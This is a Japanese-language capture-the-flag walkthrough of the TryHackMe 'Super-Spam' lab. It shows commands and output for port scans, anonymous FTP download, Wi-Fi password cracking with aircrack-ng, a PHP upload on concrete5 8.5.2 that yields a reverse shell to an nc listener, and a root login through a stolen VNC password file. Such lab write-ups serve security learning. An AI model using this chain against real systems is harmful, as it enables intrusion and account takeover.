# Super-Spam CTF

https://tryhackme.com/room/superspamr

## Enumeration

```shell
TARGET=10.48.130.196
sudo bash -c "echo $TARGET   spam >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE         REASON
80/tcp   open  http            syn-ack ttl 64
4012/tcp open  pda-gate        syn-ack ttl 64
4019/tcp open  talarian-mcast5 syn-ack ttl 64
5901/tcp open  vnc-1           syn-ack ttl 64
6001/tcp open  X11:1           syn-ack ttl 64
```

```sh
sudo nmap -sV -p80,4012,4019,5901,6001 $TARGET

PORT     STATE SERVICE  VERSION
80/tcp   open  ssl/http Apache/2.4.41 (Ubuntu)
4012/tcp open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
4019/tcp open  ftp      vsftpd 3.0.5
5901/tcp open  vnc      VNC (protocol 3.8)
6001/tcp open  X11      (access denied)
```

HTTP, SSH, FTP, VNC

```sh
# 指定可能なオプションは、nikto -h
nikto -p 80 -T 1 2 3 -h $TARGET
```

### HTTP

`<meta name="generator" content="concrete5 - 8.5.2"/>`

https://github.com/advisories/GHSA-36v6-hf6j-m7qp

8.5.2 まで、ファイルマネージャーを介してPHPなどのファイルをアップロードできる。

### FTP

再帰的にダウンロード

```sh
wget -r --user="anonymous" --password="" ftp://spam:4019
```

note.txt

```sh
$ cat note.txt
12th January: Note to self. Our IDS seems to be experiencing high volumes of unusual activity.
We need to contact our security consultants as soon as possible. I fear something bad is going
to happen. -adam

13th January: We've included the wireshark files to log all of the unusual activity. It keeps
occuring during midnight. I am not sure why.. This is very odd... -adam

15th January: I could swear I created a new blog just yesterday. For some reason it is gone... -adam

24th January: Of course it is... - super-spam :)
```

- adam ユーザー
- IDSが異常なアクティビティを検出した
- Wiresharkファイルがある

```sh
$ cat .cap/.quicknote.txt 
It worked... My evil plan is going smoothly.
 I will place this .cap file here as a souvenir to remind me of how I got in...
 Soon! Very soon!
 My Evil plan of a linux-free galaxy will be complete.
 Long live Windows, the superior operating system!
```

capファイルを見れば、どうやって侵入したかわかるらしい

### cap

802.1X ワイヤレス認証のパケットキャプチャだった。  
aircrack-ng でパスワードクラックできた。

```sh
$ aircrack-ng -w /usr/share/wordlists/rockyou.txt .cap/SamsNetwork.cap

      [00:03:35] 786973/14344392 keys tested (3716.92 k/s) 

      Time left: 1 hour, 47 seconds                              5.49%

                           KEY FOUND! [ REDACTED ]


      Master Key     : 93 5E 0C 77 A3 B7 17 62 0D 1E 31 22 51 C0 42 92 
                       6E CF 91 EE 54 6B E1 E3 A8 6F 81 FF AA B6 64 E1 

      Transient Key  : 70 72 6D 26 15 45 F9 82 D4 AE A9 29 B9 E7 57 42 
                       7A 40 B4 D1 C3 27 EE 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : 1E FB DC A0 1D 48 49 61 3B 9A D7 61 66 71 89 B0 
```

- SSHログインは失敗(adam)
- http://spam/concrete5/index.php/login でのログイン失敗(Adam_Admin)
- Donald_Dump ユーザーでログインできた

## concrete5

システム設定から php 拡張子を許可してから pentest.php をアップロード。

```sh
$ nc -nlvp 8888    
listening on [any] 8888 ...
connect to [192.168.138.236] from (UNKNOWN) [10.48.130.196] 53826
Linux ip-10-48-130-196 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 01:32:46 up  1:11,  1 user,  load average: 0.25, 0.08, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0    :1               00:22    1:10m  0.00s  0.00s sh
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格１

```sh
www-data@ip-10-48-130-196:/$ ls -al /home
total 36
drwxr-xr-x  9 root             root             4096 Jul  3 18:08 .
drwxr-xr-x 23 root             root             4096 Dec 13 00:22 ..
drwxr-xr-x  2 benjamin_blogger benjamin_blogger 4096 Apr  9  2021 benjamin_blogger
drw-rw----  6 donalddump       donalddump       4096 Apr  9  2021 donalddump
drwxr-xr-x  7 lucy_loser       lucy_loser       4096 Apr  9  2021 lucy_loser
drwxr-xr-x  5 root             root             4096 May 30  2021 personal
drwxr-xr-x  2 ssm-user         ssm-user         4096 Jun 29 12:56 ssm-user
drwxr-xr-x  4 super-spam       super-spam       4096 Apr  9  2021 super-spam
drwxr-xr-x  4 ubuntu           ubuntu           4096 Jul  3 18:09 ubuntu
```

ユーザーフラグ

```sh
www-data@ip-10-48-130-196:/home$ cat ./personal/Work/flag.txt
user_flag: flag{...}
```

```sh
www-data@ip-10-48-130-196:/home$ cat ./lucy_loser/calcs.txt
Suzy logs. to be completed.
```

```sh
www-data@ip-10-48-130-196:/home$ cat ./personal/Workload/nextEvilPlan.txt
My next evil plan is to ensure that all linux filesystems are disorganised so that these 
linux users will never find what they are looking for (whatever that is)... That should
stop them from gaining back control!
```

```sh
www-data@ip-10-48-130-196:/home$ cat ./super-spam/flagOfWindows
I am pleased to announce that our plan is going so well. I truly cannot wait to purge the galaxy of that inferior operating system, Linux.
Let this flag of windows stand strongly against the wind for all to see. A pure windows galaxy is what we want!
```

同じキーを８回使いまわした。大事なのは１番目と８番目のメッセージとのこと。

```sh
www-data@ip-10-48-130-196:/home$ cat ./lucy_loser/.MessagesBackupToGalactic/note.txt
Note to self. General super spam mentioned that I should not make the same mistake again of re-using the same key for the XOR encryption of our messages to Alpha Solaris IV's headquarters, otherwise we could have some serious issues if our encrypted messages are compromised. I must keep reminding myself,do not re-use keys,I have done it 8 times already!.The most important messages we sent to the HQ were the first and eighth message.I hope they arrived safely.They are crucial to our end goal.
```

2つの画像ファイルを、ピクセルごとにxorするスクリプト。

```python
www-data@ip-10-48-130-196:/home$ cat ./lucy_loser/.MessagesBackupToGalactic/xored.py
from PIL import Image

print("[!] Note Add extention also.")

pic1_name=input("[-] Enter First Image: " )
pic2_name=input("[-] Enter Second Image: ")
out_name=input("[-] Enter Name of The output image:")


pic1=Image.open(pic1_name)
print("[+] Reading pic1")  #finding the size of picture1 
pic2=Image.open(pic2_name)
print("[+] Reading pic2") #finding the size of picture2

#pic2=pic1.resize(pic1.size) #resizing the pic2 according to pic1
#print("[+] pic2 resized Successfully.")

'''
so that we can xor each and every coordinate of both the pictures
'''

print(pic2) #After Resizing

x_cord_pic1=pic1.size[0]
y_cord_pic1=pic1.size[1]

newpic = Image.new('RGB',pic1.size) # Creating NEW image

for y in range(y_cord_pic1):
    for x in range(x_cord_pic1):
        pixel_1=pic1.getpixel((x,y))
        pixel_2=pic2.getpixel((x,y))
        newpixel =[]
        for p in range(len(pixel_1[:3])): #for all three values

            newpixel.append(pixel_1[p] ^ pixel_2[p]) # ^ --> use to xor two Values
        newpixel=tuple(newpixel)
        #print(newpixel)
        newpic.putpixel((x,y),newpixel)
print("[+] Xored successfully")
print("[+]  Successfully saved as "+out_name)
newpic.save(out_name)
```

XOR暗号された画像 c1～c10。d.png は２つの文字列画像のXORをとったものと思われる。

```sh
www-data@ip-10-48-130-196:/home/lucy_loser/.MessagesBackupToGalactic$ ls -al
total 1720
drwxr-xr-x 2 lucy_loser lucy_loser   4096 May 30  2021 .
drwxr-xr-x 7 lucy_loser lucy_loser   4096 Apr  9  2021 ..
-rw-r--r-- 1 lucy_loser lucy_loser 172320 Apr  8  2021 c1.png
-rw-r--r-- 1 lucy_loser lucy_loser 171897 Apr  8  2021 c10.png
-rw-r--r-- 1 lucy_loser lucy_loser 168665 Apr  8  2021 c2.png
-rw-r--r-- 1 lucy_loser lucy_loser 171897 Apr  8  2021 c3.png
-rw-r--r-- 1 lucy_loser lucy_loser 171462 Apr  8  2021 c4.png
-rw-r--r-- 1 lucy_loser lucy_loser 167772 Apr  8  2021 c5.png
-rw-r--r-- 1 lucy_loser lucy_loser 167772 Apr  8  2021 c6.png
-rw-r--r-- 1 lucy_loser lucy_loser 171462 Apr  8  2021 c7.png
-rw-r--r-- 1 lucy_loser lucy_loser 171734 Apr  8  2021 c8.png
-rw-r--r-- 1 lucy_loser lucy_loser 173994 Apr  8  2021 c9.png
-rw-r--r-- 1 lucy_loser lucy_loser  20987 Apr  8  2021 d.png
-rw-r--r-- 1 lucy_loser lucy_loser    497 May 30  2021 note.txt
-rw-r--r-- 1 lucy_loser lucy_loser   1200 Apr  8  2021 xored.py
```

それぞれのXORを観察して分かったこと

- c1-c10 はすべて同じマスク画像でXORされている
- c4=c7, c5=c6 はそれぞれ同じ内容（XORをかけたら黒一色になるので）
- c2 と c4 は文字ではなく線が引いてあるだけ。c2に６本の線を足したのがc4。

c2,c8 のXORと、d.png を観察すると、なんとか問４の文字列を読み取れた。

これは root パスワードではなかった。donalddumpユーザーのパスワードとして使えた。

```sh
donalddump@ip-10-49-152-36:/$ 
```

## 権限昇格２

ホームディレクトリを読めないのでパーミッションを変更。

```sh
donalddump@ip-10-49-152-36:/$ chmod +x /home/donalddump
```

```sh
donalddump@ip-10-49-152-36:~$ ls -al
total 44
drwxrwx--x 6 donalddump donalddump 4096 Apr  9  2021 .
drwxr-xr-x 9 root       root       4096 Jul  3 18:08 ..
lrwxrwxrwx 1 root       root          9 Apr  9  2021 .bash_history -> /dev/null
-rw-r--r-- 1 donalddump donalddump  220 Feb 20  2021 .bash_logout
-rw-r--r-- 1 donalddump donalddump 3771 Feb 20  2021 .bashrc
drwx------ 2 donalddump donalddump 4096 Apr  8  2021 .cache
drwx------ 3 donalddump donalddump 4096 Apr  8  2021 .gnupg
drwxr-xr-x 2 root       root       4096 Feb 24  2021 morning
drwxr-xr-x 2 root       root       4096 Feb 24  2021 notes
-rw-r--r-- 1 root       root          8 Apr  8  2021 passwd
-rw-r--r-- 1 donalddump donalddump  807 Feb 20  2021 .profile
-rw-rw-r-- 1 donalddump donalddump   36 Apr  9  2021 user.txt
```

user.txt の内容は前に入手したフラグと同じ。passwdは謎のバイナリファイル。

```sh
donalddump@ip-10-49-152-36:~$ cat passwd
[REDACTED]
```

Xtightvncのプロセスがある。

```sh
root         866  0.0  0.7  18264 14012 ?        S    07:35   0:00 Xtightvnc :1 -desktop X -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -fp /usr/share/fonts/X11/misc/,/usr
```

passwd ファイルを使ってVNC接続

```sh
vncviewer -passwd ./passwd 10.49.157.157:5901
```

```sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

Base32でデコードできた。

```sh
# cat /root/.nothing/r00t.txt

what am i?: MZWGC[REDACTED]

KRUGS4ZANF[REDACTED]
```

## 振り返り

- ワイヤレスハッキングがテーマのCTFは初見。Courseraのコースで学んだことが役に立った。
- VNCをCTFで使ったのも初見。

## Tags

#tags:aircrack-ng #tags:concrete5 #tags:XOR暗号（画像） #tags:VNC
